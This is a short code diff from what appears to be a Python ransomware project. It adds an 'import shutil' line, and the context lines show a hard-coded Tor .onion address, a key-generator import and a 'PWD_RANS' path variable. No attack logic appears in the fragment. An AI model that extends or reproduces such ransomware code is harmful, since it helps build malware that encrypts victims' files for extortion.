@@ -16,6 +16,7 @@ import os, sys, struct
 import argparse
 from KeyDir.keygenerator import class_keys
 import subprocess
+import shutil
 
 URL_TOR = "lxu7zbrvwbo7ogy7u7yzy65yld2rdgjfcwgoyrkejedqoefboeejspid.onion"
 PWD_RANS = os.path.dirname(os.path.abspath(__file__))
